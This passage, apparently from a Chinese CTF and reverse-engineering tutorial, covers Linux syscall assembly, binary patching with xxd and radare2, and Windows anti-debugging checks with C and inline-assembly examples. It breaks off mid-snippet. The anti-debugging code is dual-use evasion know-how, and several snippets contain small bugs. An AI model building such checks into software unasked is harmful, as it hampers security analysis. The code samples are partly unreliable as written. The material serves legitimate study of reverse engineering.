\u6700\u540e\u56e0\u4e3a\u5185\u6838\u7f16\u8bd1\u9ed8\u8ba4\u5f00\u542f\u4e86 -O2 \u4f18\u5316\uff0c\u53ef\u4ee5\u4fee\u6539 Makefile \u4e3a -O0 \uff1a KBUILD_CFLAGS += -O0 \u7f16\u8bd1\u5185\u6838\uff1a $ make \u5b8c\u6210\u540e\u5f53\u7136\u5c31\u662f\u5b89\u88c5\uff0c\u4f46\u6211\u4eec\u8fd9\u91cc\u5e76\u4e0d\u662f\u771f\u7684\u8981\u5c06\u672c\u673a\u7684\u5185\u6838\u6362\u6389\uff0c\u63a5\u4e0b\u6765\u7684\u8fc7\u7a0b\u5c31\u4ea4\u7ed9 QEMU \u4e86\u3002\uff08\u53c2\u8003\u7ae0\u82824.1\uff09 \u7cfb\u7edf\u8c03\u7528 \u5728 Linux \u4e2d\uff0c\u7cfb\u7edf\u8c03\u7528\u662f\u4e00\u4e9b\u5185\u6838\u7a7a\u95f4\u51fd\u6570\uff0c\u662f\u7528\u6237\u7a7a\u95f4\u8bbf\u95ee\u5185\u6838\u7684\u552f\u4e00\u624b\u6bb5\u3002\u8fd9\u4e9b\u51fd\u6570\u4e0e CPU \u67b6\u6784\u6709\u5173\uff0cx86-64 \u67b6\u6784\u63d0\u4f9b\u4e86 322 \u4e2a\u7cfb\u7edf\u8c03\u7528\uff0cx86 \u63d0\u4f9b\u4e86 358 \u4e2a\u7cfb\u7edf\u8c03\u7528\uff08\u53c2\u8003\u9644\u5f559.4\uff09\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u7528 32 \u4f4d\u6c47\u7f16\u5199\u7684\u4f8b\u5b50\uff0c \u6e90\u7801 \uff1a .data msg: .ascii \"hello 32-bit!\\n\" len = . - msg .text .global _start _start: movl $len, %edx movl $msg, %ecx movl $1, %ebx movl $4, %eax int $0x80 movl $0, %ebx movl $1, %eax int $0x80 \u7f16\u8bd1\u6267\u884c\uff08\u53ef\u4ee5\u7f16\u8bd1\u621064\u4f4d\u7a0b\u5e8f\u7684\uff09\uff1a $ gcc -m32 -c hello32.S $ ld -m elf_i386 -o hello32 hello32.o $ strace ./hello32 execve(\"./hello32\", [\"./hello32\"], 0x7ffff990f830 /* 68 vars */) = 0 strace: [ Process PID=19355 runs in 32 bit mode. ] write(1, \"hello 32-bit!\\n\", 14hello 32-bit! ) = 14 exit(0) = ? +++ exited with 0 +++ \u53ef\u4ee5\u770b\u5230\u7a0b\u5e8f\u5c06\u8c03\u7528\u53f7\u4fdd\u5b58\u5230 eax \uff0c\u5e76\u901a\u8fc7 int $0x80 \u6765\u4f7f\u7528\u7cfb\u7edf\u8c03\u7528\u3002 \u867d\u7136\u8f6f\u4e2d\u65ad int 0x80 \u975e\u5e38\u7ecf\u5178\uff0c\u65e9\u671f 2.6 \u53ca\u4ee5\u524d\u7248\u672c\u7684\u5185\u6838\u90fd\u4f7f\u7528\u8fd9\u79cd\u673a\u5236\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528\u3002\u4f46\u56e0\u5176\u6027\u80fd\u8f83\u5dee\uff0c\u5728\u5f80\u540e\u7684\u5185\u6838\u4e2d\u4f7f\u7528\u4e86\u5feb\u901f\u7cfb\u7edf\u8c03\u7528\u6307\u4ee4\u6765\u66ff\u4ee3\uff0c32 \u4f4d\u7cfb\u7edf\u4f7f\u7528 sysenter \uff08\u5bf9\u5e94 sysexit \uff09 \u6307\u4ee4\uff0c\u800c 64 \u4f4d\u7cfb\u7edf\u4f7f\u7528 syscall \uff08\u5bf9\u5e94 sysret \uff09 \u6307\u4ee4\u3002 \u4e00\u4e2a\u4f7f\u7528 sysenter \u7684\u4f8b\u5b50\uff1a .data msg: .ascii \"Hello sysenter!\\n\" len = . - msg .text .globl _start _start: movl $len, %edx movl $msg, %ecx movl $1, %ebx movl $4, %eax # Setting the stack for the systenter pushl $sysenter_ret pushl %ecx pushl %edx pushl %ebp movl %esp, %ebp sysenter sysenter_ret: movl $0, %ebx movl $1, %eax # Setting the stack for the systenter pushl $sysenter_ret pushl %ecx pushl %edx pushl %ebp movl %esp, %ebp sysenter $ gcc -m32 -c sysenter.S $ ld -m elf_i386 -o sysenter sysenter.o $ strace ./sysenter execve(\"./sysenter\", [\"./sysenter\"], 0x7fff73993fd0 /* 69 vars */) = 0 strace: [ Process PID=7663 runs in 32 bit mode. ] write(1, \"Hello sysenter!\\n\", 16Hello sysenter! ) = 16 exit(0) = ? +++ exited with 0 +++ \u53ef\u4ee5\u770b\u5230\uff0c\u4e3a\u4e86\u4f7f\u7528 sysenter \u6307\u4ee4\uff0c\u9700\u8981\u4e3a\u5176\u624b\u52a8\u5e03\u7f6e\u6808\u3002\u8fd9\u662f\u56e0\u4e3a\u5728 sysenter \u8fd4\u56de\u65f6\uff0c\u4f1a\u6267\u884c __kernel_vsyscall \u7684\u540e\u534a\u90e8\u5206\uff08\u4ece0xf7fd5059\u5f00\u59cb\uff09\uff1a gdb-peda$ vmmap vdso Start End Perm Name 0xf7fd4000 0xf7fd6000 r-xp [vdso] gdb-peda$ disassemble __kernel_vsyscall Dump of assembler code for function __kernel_vsyscall: 0xf7fd5050 <+0>: push ecx 0xf7fd5051 <+1>: push edx 0xf7fd5052 <+2>: push ebp 0xf7fd5053 <+3>: mov ebp,esp 0xf7fd5055 <+5>: sysenter 0xf7fd5057 <+7>: int 0x80 0xf7fd5059 <+9>: pop ebp 0xf7fd505a <+10>: pop edx 0xf7fd505b <+11>: pop ecx 0xf7fd505c <+12>: ret End of assembler dump. __kernel_vsyscall \u5c01\u88c5\u4e86 sysenter \u8c03\u7528\u7684\u89c4\u8303\uff0c\u662f vDSO \u7684\u4e00\u90e8\u5206\uff0c\u800c vDSO \u5141\u8bb8\u7a0b\u5e8f\u5728\u7528\u6237\u5c42\u4e2d\u6267\u884c\u5185\u6838\u4ee3\u7801\u3002\u5173\u4e8e vDSO \u7684\u5185\u5bb9\u6211\u4eec\u5c06\u5728\u540e\u9762\u7684\u7ae0\u8282\u4e2d\u7ec6\u8bb2\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a 64 \u4f4d\u4f7f\u7528 syscall \u7684\u4f8b\u5b50\uff1a .data msg: .ascii \"Hello 64-bit!\\n\" len = . - msg .text .global _start _start: movq $1, %rdi movq $msg, %rsi movq $len, %rdx movq $1, %rax syscall xorq %rdi, %rdi movq $60, %rax syscall \u7f16\u8bd1\u6267\u884c\uff08\u4e0d\u80fd\u7f16\u8bd1\u621032\u4f4d\u7a0b\u5e8f\uff09\uff1a $ gcc -c hello64.S $ ld -o hello64 hello64.o $ strace ./hello64 execve(\"./hello64\", [\"./hello64\"], 0x7ffe11485290 /* 68 vars */) = 0 write(1, \"Hello 64-bit!\\n\", 14Hello 64-bit! ) = 14 exit(0) = ? +++ exited with 0 +++ \u5728\u8fd9\u4e24\u4e2a\u4f8b\u5b50\u4e2d\u6211\u4eec\u76f4\u63a5\u4f7f\u7528\u4e86 execve \u3001 write \u548c exit \u4e09\u4e2a\u7cfb\u7edf\u8c03\u7528\u3002\u4f46\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u5e94\u7528\u7a0b\u5e8f\u901a\u8fc7\u5728\u7528\u6237\u7a7a\u95f4\u5b9e\u73b0\u7684\u5e94\u7528\u7f16\u7a0b\u63a5\u53e3\uff08API\uff09\u800c\u4e0d\u662f\u76f4\u63a5\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528\u6765\u7f16\u7a0b\u3002\u4f8b\u5982\u51fd\u6570 printf() \u7684\u8c03\u7528\u8fc7\u7a0b\u662f\u8fd9\u6837\u7684\uff1a \u8c03\u7528printf() ==> C\u5e93\u4e2d\u7684printf() ==> C\u5e93\u4e2d\u7684write() ==> write()\u7cfb\u7edf\u8c03\u7528 patch \u4e8c\u8fdb\u5236\u6587\u4ef6 \u4ec0\u4e48\u662f patch \u624b\u5de5 patch \u4f7f\u7528\u5de5\u5177 patch \u4ec0\u4e48\u662f patch \u8bb8\u591a\u65f6\u5019\uff0c\u6211\u4eec\u4e0d\u80fd\u83b7\u5f97\u7a0b\u5e8f\u6e90\u7801\uff0c\u53ea\u80fd\u76f4\u63a5\u5bf9\u4e8c\u8fdb\u5236\u6587\u4ef6\u8fdb\u884c\u4fee\u6539\uff0c\u8fd9\u5c31\u662f\u6240\u8c13\u7684 patch\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528\u5341\u516d\u8fdb\u5236\u7f16\u8f91\u5668\u76f4\u63a5\u4fee\u6539\u6587\u4ef6\u7684\u5b57\u8282\uff0c\u4e5f\u53ef\u4ee5\u5229\u7528\u4e00\u4e9b\u534a\u81ea\u52a8\u5316\u7684\u5de5\u5177\u3002 patch \u6709\u5f88\u591a\u79cd\u5f62\u5f0f\uff1a patch \u4e8c\u8fdb\u5236\u6587\u4ef6\uff08\u7a0b\u5e8f\u6216\u5e93\uff09 \u5728\u5185\u5b58\u91cc patch\uff08\u5229\u7528\u8c03\u8bd5\u5668\uff09 \u9884\u52a0\u8f7d\u5e93\u66ff\u6362\u539f\u5e93\u6587\u4ef6\u4e2d\u7684\u51fd\u6570 triggers\uff08hook \u7136\u540e\u5728\u8fd0\u884c\u65f6 patch\uff09 \u624b\u5de5 patch \u624b\u5de5 patch \u81ea\u7136\u4f1a\u6bd4\u8f83\u9ebb\u70e6\uff0c\u4f46\u80fd\u8ba9\u6211\u4eec\u66f4\u597d\u5730\u7406\u89e3\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u6784\u6210\uff0c\u4ee5\u53ca\u7a0b\u5e8f\u7684\u94fe\u63a5\u548c\u52a0\u8f7d\u3002\u6709\u8bb8\u591a\u5de5\u5177\u53ef\u4ee5\u505a\u5230\u8fd9\u4e00\u70b9\uff0c\u6bd4\u5982 xxd\u3001dd\u3001gdb\u3001radare2 \u7b49\u7b49\u3002 xxd $ echo 01: 01 02 03 04 05 06 07 08 | xxd -r - output $ xxd -g1 output 00000000: 00 01 02 03 04 05 06 07 08 ......... $ echo 04: 41 42 43 44 | xxd -r - output $ xxd -g1 output 00000000: 00 01 02 03 41 42 43 44 08 ....ABCD. \u53c2\u6570 -r \u7528\u4e8e\u5c06 hexdump \u8f6c\u6362\u6210 binary\u3002\u8fd9\u91cc\u6211\u4eec\u5148\u521b\u5efa\u4e00\u4e2a binary\uff0c\u7136\u540e\u5c06\u5c06\u5176\u4e2d\u51e0\u4e2a\u5b57\u8282\u6539\u6389\u3002 radare2 \u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff1a #include<stdio.h> void main() { printf(\"hello\"); puts(\"world\"); } $ gcc -no-pie patch.c $ ./a.out helloworld \u4e0b\u9762\u901a\u8fc7\u8ba1\u7b97\u51fd\u6570\u504f\u79fb\uff0c\u6211\u4eec\u5c06 printf \u6362\u6210 puts \uff1a [0x004004e0]> pdf @ main ;-- main: / (fcn) sym.main 36 | sym.main (); | ; DATA XREF from 0x004004fd (entry0) | 0x004005ca 55 push rbp | 0x004005cb 4889e5 mov rbp, rsp | 0x004005ce 488d3d9f0000. lea rdi, str.hello ; 0x400674 ; \"hello\" | 0x004005d5 b800000000 mov eax, 0 | 0x004005da e8f1feffff call sym.imp.printf ; int printf(const char *format) | 0x004005df 488d3d940000. lea rdi, str.world ; 0x40067a ; \"world\" | 0x004005e6 e8d5feffff call sym.imp.puts ; sym.imp.printf-0x10 ; int printf(const char *format) | 0x004005eb 90 nop | 0x004005ec 5d pop rbp \\ 0x004005ed c3 ret \u5730\u5740 0x004005da \u5904\u7684\u8bed\u53e5\u662f call sym.imp.printf \uff0c\u5176\u4e2d\u673a\u5668\u7801 e8 \u4ee3\u8868 call \uff0c\u6240\u4ee5 sym.imp.printf \u7684\u504f\u79fb\u662f 0xfffffef1 \u3002\u5730\u5740 0x004005e6 \u5904\u7684\u8bed\u53e5\u662f call sym.imp.puts \uff0c sym.imp.puts \u7684\u504f\u79fb\u662f 0xfffffed5 \u3002 \u63a5\u4e0b\u6765\u627e\u5230\u4e24\u4e2a\u51fd\u6570\u7684 plt \u5730\u5740\uff1a [0x004004e0]> is~printf vaddr=0x004004d0 paddr=0x000004d0 ord=003 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.printf [0x004004e0]> is~puts vaddr=0x004004c0 paddr=0x000004c0 ord=002 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.puts \u8ba1\u7b97\u76f8\u5bf9\u4f4d\u7f6e\uff1a [0x004004e0]> ?v 0x004004d0-0x004004c0 0x10 \u6240\u4ee5\u8981\u60f3\u5c06 printf \u66ff\u6362\u4e3a puts \uff0c\u53ea\u8981\u66ff\u6362\u6210 0xfffffef1 -0x10 = 0xfffffee1 \u5c31\u53ef\u4ee5\u4e86\u3002 [0x004004e0]> s 0x004005da [0x004005da]> wx e8e1feffff [0x004005da]> pd 1 | 0x004005da e8e1feffff call sym.imp.puts ; sym.imp.printf-0x10 ; int printf(const char *format) \u641e\u5b9a\u3002 $ ./a.out hello world \u5f53\u7136\u8fd8\u53ef\u4ee5\u5c06\u8fd9\u4e00\u8fc7\u7a0b\u66f4\u52a0\u7b80\u5316\uff0c\u76f4\u63a5\u8f93\u5165\u6c47\u7f16\uff0c\u5176\u4ed6\u7684\u4e8b\u60c5 r2 \u4f1a\u5e2e\u4f60\u641e\u5b9a\uff1a [0x004005da]> wa call 0x004004c0 Written 5 bytes (call 0x004004c0) = wx e8e1feffff [0x004005da]> wa call sym.imp.puts Written 5 bytes (call sym.imp.puts) = wx e8e1feffff \u4f7f\u7528\u5de5\u5177 patch patchkit patchkit \u53ef\u4ee5\u8ba9\u6211\u4eec\u901a\u8fc7 Python \u811a\u672c\u6765 patch ELF \u4e8c\u8fdb\u5236\u6587\u4ef6\u3002 \u53cd\u8c03\u8bd5\u6280\u672f \u4ec0\u4e48\u662f\u53cd\u8c03\u8bd5 \u53cd\u8c03\u8bd5\u6280\u672f \u53c2\u8003\u8d44\u6599 \u4ec0\u4e48\u662f\u53cd\u8c03\u8bd5 \u53cd\u8c03\u8bd5\u662f\u4e00\u79cd\u91cd\u8981\u7684\u8f6f\u4ef6\u4fdd\u62a4\u6280\u672f\uff0c\u7279\u522b\u662f\u5728\u5404\u79cd\u6e38\u620f\u4fdd\u62a4\u4e2d\u88ab\u5c24\u5176\u91cd\u89c6\u3002\u53e6\u5916\uff0c\u6076\u610f\u4ee3\u7801\u5f80\u5f80\u4e5f\u4f1a\u5229\u7528\u53cd\u8c03\u8bd5\u6765\u5bf9\u6297\u5b89\u5168\u5206\u6790\u3002\u5f53\u7a0b\u5e8f\u610f\u8bc6\u5230\u81ea\u5df1\u53ef\u80fd\u5904\u4e8e\u8c03\u8bd5\u4e2d\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u4f1a\u6539\u53d8\u6b63\u5e38\u7684\u6267\u884c\u8def\u5f84\u6216\u8005\u4fee\u6539\u81ea\u8eab\u7a0b\u5e8f\u8ba9\u81ea\u5df1\u5d29\u6e83\uff0c\u4ece\u800c\u589e\u52a0\u8c03\u8bd5\u65f6\u95f4\u548c\u590d\u6742\u5ea6\u3002 \u53cd\u8c03\u8bd5\u6280\u672f \u4e0b\u9762\u5148\u4ecb\u7ecd\u51e0\u79cd Windows \u4e0b\u7684\u53cd\u8c03\u8bd5\u65b9\u6cd5\u3002 \u51fd\u6570\u68c0\u6d4b \u51fd\u6570\u68c0\u6d4b\u5c31\u662f\u901a\u8fc7 Windows \u81ea\u5e26\u7684\u516c\u5f00\u6216\u672a\u516c\u5f00\u7684\u51fd\u6570\u76f4\u63a5\u68c0\u6d4b\u7a0b\u5e8f\u662f\u5426\u5904\u4e8e\u8c03\u8bd5\u72b6\u6001\u3002\u6700\u7b80\u5355\u7684\u8c03\u8bd5\u5668\u68c0\u6d4b\u51fd\u6570\u662f IsDebuggerPresent() \uff1a BOOL WINAPI IsDebuggerPresent(void); \u8be5\u51fd\u6570\u67e5\u8be2\u8fdb\u7a0b\u73af\u5883\u5757\uff08PEB\uff09\u4e2d\u7684 BeingDebugged \u6807\u5fd7\uff0c\u5982\u679c\u8fdb\u7a0b\u5904\u5728\u8c03\u8bd5\u4e0a\u4e0b\u6587\u4e2d\uff0c\u5219\u8fd4\u56de\u4e00\u4e2a\u975e\u96f6\u503c\uff0c\u5426\u5219\u8fd4\u56de\u96f6\u3002 \u793a\u4f8b\uff1a BOOL CheckDebug() { return IsDebuggerPresent(); } CheckRemoteDebuggerPresent() \u7528\u4e8e\u68c0\u6d4b\u4e00\u4e2a\u8fdc\u7a0b\u8fdb\u7a0b\u662f\u5426\u5904\u4e8e\u8c03\u8bd5\u72b6\u6001\uff1a BOOL WINAPI CheckRemoteDebuggerPresent( _In_ HANDLE hProcess, _Inout_ PBOOL pbDebuggerPresent ); \u5982\u679c hProcess \u53e5\u67c4\u8868\u793a\u7684\u8fdb\u7a0b\u5904\u4e8e\u8c03\u8bd5\u4e0a\u4e0b\u6587\uff0c\u5219\u8bbe\u7f6e pbDebuggerPresent \u53d8\u91cf\u88ab\u8bbe\u7f6e\u4e3a TRUE \uff0c\u5426\u5219\u88ab\u8bbe\u7f6e\u4e3a FALSE \u3002 BOOL CheckDebug() { BOOL ret; CheckRemoteDebuggerPresent(GetCurrentProcess(), &ret); return ret; } NtQueryInformationProcess \u7528\u4e8e\u83b7\u53d6\u7ed9\u5b9a\u8fdb\u7a0b\u7684\u4fe1\u606f\uff1a NTSTATUS WINAPI NtQueryInformationProcess( _In_ HANDLE ProcessHandle, _In_ PROCESSINFOCLASS ProcessInformationClass, _Out_ PVOID ProcessInformation, _In_ ULONG ProcessInformationLength, _Out_opt_ PULONG ReturnLength ); \u7b2c\u4e8c\u4e2a\u53c2\u6570 ProcessInformationClass \u7ed9\u5b9a\u4e86\u9700\u8981\u67e5\u8be2\u7684\u8fdb\u7a0b\u4fe1\u606f\u7c7b\u578b\u3002\u5f53\u7ed9\u5b9a\u503c\u4e3a 0 \uff08 ProcessBasicInformation \uff09\u6216 7 \uff08 ProcessDebugPort \uff09\u65f6\uff0c\u5c31\u80fd\u5f97\u5230\u76f8\u5173\u8c03\u8bd5\u4fe1\u606f\uff0c\u8fd4\u56de\u4fe1\u606f\u4f1a\u5199\u5230\u7b2c\u4e09\u4e2a\u53c2\u6570 ProcessInformation \u6307\u5411\u7684\u7f13\u51b2\u533a\u4e2d\u3002 \u793a\u4f8b\uff1a BOOL CheckDebug() { DWORD dbgport = 0; HMODULE hModule = LoadLibrary(\"Ntdll.dll\"); NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hModule, \"NtQueryInformationProcess\"); NtQueryInformationProcess(GetCurrentProcess(), 7, &dbgPort, sizeof(dbgPort), NULL); return dbgPort != 0; } \u6570\u636e\u68c0\u6d4b \u6570\u636e\u68c0\u6d4b\u662f\u6307\u7a0b\u5e8f\u901a\u8fc7\u6d4b\u8bd5\u4e00\u4e9b\u4e0e\u8c03\u8bd5\u76f8\u5173\u7684\u5173\u952e\u4f4d\u7f6e\u7684\u6570\u636e\u6765\u5224\u65ad\u662f\u5426\u5904\u4e8e\u8c03\u8bd5\u72b6\u6001\u3002\u6bd4\u5982\u4e0a\u9762\u6240\u8bf4\u7684 PEB \u4e2d\u7684 BeingDebugged \u53c2\u6570\u3002\u6570\u636e\u68c0\u6d4b\u5c31\u662f\u76f4\u63a5\u5b9a\u4f4d\u5230\u8fd9\u4e9b\u6570\u636e\u5730\u5740\u5e76\u6d4b\u8bd5\u5176\u4e2d\u7684\u6570\u636e\uff0c\u4ece\u800c\u907f\u514d\u8c03\u7528\u51fd\u6570\uff0c\u4f7f\u7a0b\u5e8f\u7684\u884c\u4e3a\u66f4\u52a0\u9690\u853d\u3002 \u793a\u4f8b\uff1a BOOL CheckDebug() { int BeingDebug = 0; __asm { mov eax, dword ptr fs:[30h] ; \u6307\u5411PEB\u57fa\u5730\u5740 mov eax, dword ptr [eax+030h] movzx eax, byte ptr [eax+2] mov BeingDebug, eax } return BeingDebug != 0; } \u7531\u4e8e\u8c03\u8bd5\u5668\u4e2d\u542f\u52a8\u7684\u8fdb\u7a0b\u4e0e\u6b63\u5e38\u542f\u52a8\u7684\u8fdb\u7a0b\u521b\u5efa\u5806\u7684\u65b9\u5f0f\u6709\u4e9b\u4e0d\u540c\uff0c\u7cfb\u7edf\u4f7f\u7528 PEB \u7ed3\u6784\u504f\u79fb\u91cf 0x68 \u5904\u7684\u4e00\u4e2a\u672a\u516c\u5f00\u7684\u4f4d\u7f6e\uff0c\u6765\u51b3\u5b9a\u5982\u679c\u521b\u5efa\u5806\u7ed3\u6784\u3002\u5982\u679c\u8fd9\u4e2a\u4f4d\u7f6e\u4e0a\u7684\u503c\u4e3a 0x70 \uff0c\u5219\u8fdb\u7a0b\u5904\u4e8e\u8c03\u8bd5\u5668\u4e2d\u3002 \u793a\u4f8b\uff1a BOOL CheckDebug() { int BeingDbg = 0; __asm { mov eax, dword ptr fs:[30h] mov eax, dword ptr [eax + 68h] and eax, 0x70 mov BeingDbg, eax } return BeingDbg != 0; } \u7b26\u53f7\u68c0\u6d4b \u7b26\u53f7\u68c0\u6d4b\u4e3b\u8981\u9488\u5bf9\u4e00\u4e9b\u4f7f\u7528\u4e86\u9a71\u52a8\u7684\u8c03\u8bd5\u5668\u6216\u76d1\u89c6\u5668\uff0c\u8fd9\u7c7b\u8c03\u8bd5\u5668\u5728\u542f\u52a8\u540e\u4f1a\u521b\u5efa\u76f8\u5e94\u7684\u9a71\u52a8\u94fe\u63a5\u7b26\u53f7\uff0c\u4ee5\u7528\u4e8e\u5e94\u7528\u5c42\u4e0e\u5176\u9a71\u52a8\u7684\u901a\u4fe1\u3002\u4f46\u7531\u4e8e\u8fd9\u4e9b\u7b26\u53f7\u4e00\u822c\u90fd\u6bd4\u8f83\u56fa\u5b9a\uff0c\u6240\u4ee5\u5c31\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e9b\u7b26\u53f7\u6765\u786e\u5b9a\u662f\u5426\u5b58\u5728\u76f8\u5e94\u7684\u8c03\u8bd5\u8f6f\u4ef6\u3002 \u793a\u4f8b\uff1a BOOL CheckDebug() { HANDLE hDevice = CreateFileA(\"\\\\\\\\.\\\\PROCEXP153\", GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0); if (hDevice) { return 0; } } \u7a97\u53e3\u68c0\u6d4b \u7a97\u53e3\u68c0\u6d4b\u901a\u8fc7\u68c0\u6d4b\u5f53\u524d\u684c\u9762\u4e2d\u662f\u5426\u5b58\u5728\u7279\u5b9a\u7684\u8c03\u8bd5\u7a97\u53e3\u6765\u5224\u65ad\u662f\u5426\u5b58\u5728\u8c03\u8bd5\u5668\uff0c\u4f46\u4e0d\u80fd\u5224\u65ad\u8be5\u8c03\u8bd5\u5668\u662f\u5426\u6b63\u5728\u8c03\u8bd5\u8be5\u7a0b\u5e8f\u3002 \u793a\u4f8b\uff1a BOOL CheckDebug() { if (FindWindowA(\"OllyDbg\", 0)) { return 0; } return 1; } \u7279\u5f81\u7801\u68c0\u6d4b \u7279\u5f81\u7801\u68c0\u6d4b\u679a\u4e3e\u5f53\u524d\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\uff0c\u5e76\u5728\u8fdb\u7a0b\u7684\u5185\u5b58\u7a7a\u95f4\u4e2d\u641c\u7d22\u7279\u5b9a\u8c03\u8bd5\u5668\u7684\u4ee3\u7801\u7247\u6bb5\u3002 \u4f8b\u5982 OllyDbg \u6709\u8fd9\u6837\u4e00\u6bb5\u7279\u5f81\u7801\uff1a 0x41, 0x00, 0x62, 0x00, 0x6f, 0x00, 0x75, 0x00, 0x74, 0x00, 0x20, 0x00, 0x4f, 0x00, 0x6c, 0x00, 0x6c, 0x00, 0x79, 0x00, 0x44, 0x00, 0x62, 0x00, 0x67, 0x00, 0x00, 0x00, 0x4f, 0x00, 0x4b, 0x00, 0x00, 0x00 \u793a\u4f8b\uff1a BOOL CheckDebug() { BYTE sign[] = {0x41, 0x00, 0x62, 0x00, 0x6f, 0x00, 0x75, 0x00, 0x74, 0x00, 0x20, 0x00, 0x4f, 0x00, 0x6c, 0x00, 0x6c, 0x00, 0x79, 0x00, 0x44, 0x00, 0x62, 0x00, 0x67, 0x00, 0x00, 0x00, 0x4f, 0x00, 0x4b, 0x00, 0x00, 0x00;} PROCESSENTRY32 sentry32 = {0}; sentry32.dwSize = sizeof(sentry32); HANDLE phsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); Process32First(phsnap, &sentry32); do{ HANDLE hps = OpenProcess(MAXIMUM_ALLOWED, FALSE, sentry32.th32ProcessID); if (hps != 0) { DWORD szReaded = 0; BYTE signRemote[sizeof(sign)]; ReadProcessMemory(hps, (LPCVOID)0x4f632a, signRemote, sizeof(signRemote), &szReaded); if (szReaded > 0) { if (memcmp(sign, signRemote, sizeof(sign)) == 0) { CloseHandle(phsnap); return 0; } } } } sentry32.dwSize = sizeof(sentry32); }while(Process32Next(phsnap, &sentry32)); \u884c\u4e3a\u68c0\u6d4b \u884c\u4e3a\u68c0\u6d4b\u662f\u6307\u5728\u7a0b\u5e8f\u4e2d\u901a\u8fc7\u4ee3\u7801\u611f\u77e5\u7a0b\u5e8f\u5904\u4e8e\u8c03\u8bd5\u65f6\u4e0e\u672a\u5904\u4e8e\u8c03\u8bd5\u65f6\u7684\u5404\u79cd\u5dee\u5f02\u6765\u5224\u65ad\u7a0b\u5e8f\u662f\u5426\u5904\u4e8e\u8c03\u8bd5\u72b6\u6001\u3002\u4f8b\u5982\u6211\u4eec\u5728\u8c03\u8bd5\u65f6\u6b65\u8fc7\u4e24\u6761\u6307\u4ee4\u6240\u82b1\u8d39\u7684\u65f6\u95f4\u8fdc\u8fdc\u8d85\u8fc7 CPU \u6b63\u5e38\u6267\u884c\u82b1\u8d39\u7684\u65f6\u95f4\uff0c\u4e8e\u662f\u5c31\u53ef\u4ee5\u901a\u8fc7 rdtsc \u6307\u4ee4\u6765\u8fdb\u884c\u6d4b\u8bd5\u3002\uff08\u8be5\u6307\u4ee4\u7528\u4e8e\u5c06\u65f6\u95f4\u6807\u7b7e\u8ba1\u6570\u5668\u8bfb\u5165 EDX:EAX \u5bc4\u5b58\u5668\uff09 \u793a\u4f8b\uff1a BOOL CheckDebug() { int BeingDbg = 0; __asm { rdtsc mov ecx, edx rdtsc sub edx, ecx mov BeingDbg, edx } if (BeingDbg > 2) { return 0; } return 1; } \u65ad\u70b9\u68c0\u6d4b \u65ad\u70b9\u68c0\u6d4b\u662f\u6839\u636e\u8c03\u8bd5\u5668\u8bbe\u7f6e\u65ad\u70b9\u7684\u539f\u7406\u6765\u68c0\u6d4b\u8f6f\u4ef6\u4ee3\u7801\u4e2d\u662f\u5426\u8bbe\u7f6e\u4e86\u65ad\u70b9\u3002\u8c03\u8bd5\u5668\u4e00\u822c\u4f7f\u7528\u4e24\u8005\u65b9\u6cd5\u8bbe\u7f6e\u4ee3\u7801\u65ad\u70b9\uff1a \u901a\u8fc7\u4fee\u6539\u4ee3\u7801\u6307\u4ee4\u4e3a INT3\uff08\u673a\u5668\u7801\u4e3a0xCC\uff09\u89e6\u53d1\u8f6f\u4ef6\u5f02\u5e38 \u901a\u8fc7\u786c\u4ef6\u8c03\u8bd5\u5bc4\u5b58\u5668\u8bbe\u7f6e\u786c\u4ef6\u65ad\u70b9 \u9488\u5bf9\u8f6f\u4ef6\u65ad\u70b9\uff0c\u68c0\u6d4b\u7cfb\u7edf\u4f1a\u626b\u63cf\u6bd4\u8f83\u91cd\u8981\u7684\u4ee3\u7801\u533a\u57df\uff0c\u770b\u662f\u5426\u5b58\u5728\u591a\u4f59\u7684 INT3 \u6307\u4ee4\u3002 \u793a\u4f8b\uff1a BOOL CheckDebug() { PIMAGE_DOS_HEADER pDosHeader; PIMAGE_NT_HEADERS32 pNtHeaders; PIMAGE_SECTION_HEADER pSectionHeader; DWORD dwBaseImage = (DWORD)GetModuleHandle(NULL); pDosHeader = (PIMAGE_DOS_HEADER)dwBaseImage; pNtHeaders = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader->e_lfanew); pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pNtHeaders + sizeof(pNtHeaders->Signature) + sizeof(IMAGE_FILE_HEADER) + (WORD)pNtHeaders->FileHeader.SizeOfOptionalHeader); DWORD dwAddr = pSectionHeader->VirtualAddress + dwBaseImage; DWORD dwCodeSize = pSectionHeader->SizeOfRawData; BOOL Found = FALSE; __asm { cld mov edi,dwAddr mov ecx,dwCodeSize mov al,0CCH repne scasb ; \u5728EDI\u6307\u5411\u5927\u5c0f\u4e3aECX\u7684\u7f13\u51b2\u533a\u4e2d\u641c\u7d22AL\u5305\u542b\u7684\u5b57\u8282 jnz NotFound mov Found,1 NotFound: } return Found; } \u800c\u5bf9\u4e8e\u786c\u4ef6\u65ad\u70b9\uff0c\u7531\u4e8e\u7a0b\u5e8f\u5de5\u4f5c\u5728\u4fdd\u62a4\u6a21\u5f0f\u4e0b\uff0c\u65e0\u6cd5\u8bbf\u95ee\u786c\u4ef6\u8c03\u8bd5\u65ad\u70b9\uff0c\u6240\u4ee5\u4e00\u822c\u9700\u8981\u6784\u5efa\u5f02\u5e38\u7a0b\u5e8f\u6765\u83b7\u53d6 DR \u5bc4\u5b58\u5668\u7684\u503c\u3002 \u793a\u4f8b\uff1a BOOL CheckDebug() { CONTEXT context; HANDLE hThread = GetCurrentThread(); context.ContextFlags = CONTEXT_DEBUG_REGISTERS; GetThreadContext(hThread, &context); if (context.Dr0 != 0 || context.Dr1 != 0 || context.Dr2 != 0 || 